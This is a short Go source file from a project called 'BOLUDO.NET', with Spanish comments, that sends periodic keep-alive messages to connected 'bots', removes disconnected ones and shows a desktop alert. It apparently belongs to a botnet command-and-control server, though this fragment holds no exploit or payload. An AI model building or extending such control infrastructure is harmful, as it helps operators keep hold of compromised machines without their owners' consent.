package nets

import (
	"fmt"
	"time"

	"BOLUDO.NET/config"
	"github.com/martinlindhe/notify"
)

// KeepAlive envía mensajes de keep-alive a todos los bots conectados a intervalos regulares.
func KeepAlive() {
	for {
		config.Mutex.Lock()
		for i := 0; i < len(config.BOT); i++ {
			bot := config.BOT[i]
			_, err := bot.Write([]byte(config.KeepAliveMSG))
			if err != nil {
				// Manejar el error si el bot no responde o la conexión se ha cerrado.
				if config.Notify {
					notify.Alert("BOLUDO", "BOT DESCONECTADO", fmt.Sprint("BOT DESCONECTADO: ", bot.RemoteAddr()), "")
				}
				bot.Close()
				config.BOT = append(config.BOT[:i], config.BOT[i+1:]...)
				i-- // Ajustar el índice después de eliminar un bot de la lista.
			}
		}
		config.Mutex.Unlock()
		time.Sleep(time.Duration(config.KEEP_ALIVE) * time.Second)
	}
}
